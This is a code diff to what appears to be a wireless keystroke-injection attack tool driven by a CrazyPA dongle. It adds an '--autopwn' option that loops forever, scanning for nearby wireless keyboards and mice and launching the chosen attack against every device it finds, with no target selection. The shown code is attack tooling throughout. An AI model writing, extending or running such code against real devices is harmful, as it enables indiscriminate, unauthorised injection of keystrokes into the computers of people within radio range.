@@ -124,7 +124,8 @@ def confirm_root():
 @click.option('--address', default="", help="Address of device to target attack")
 @click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
 @click.option('--reset', is_flag=True, help="Reset CrazyPA dongle prior to initalization")
-def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
+@click.option('--autopwn', is_flag=True, help="Automatically find and attack all targets")
+def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn):
 
     banner()
     confirm_root()
@@ -173,6 +174,20 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
             raise e
 
     try:
+        if autopwn:
+            if not attack:
+                _print_err('No attack specified for autopwn. Exiting.')
+                exit(-1)
+
+            while True:
+                print(G + "[+] " + W + 'Scanning for targets...')
+                jack.scan(interval)
+                if len(jack.devices) > 0:
+                    launch_attacks(jack, jack.devices, attack)
+                else:
+                    _print_err('No devices found')
+                jack.clear_devices()
+
         if targeted:
             print(G + "[+] " + W + 'Starting sniff for %s...' % address)
             if vendor.startswith("l"):
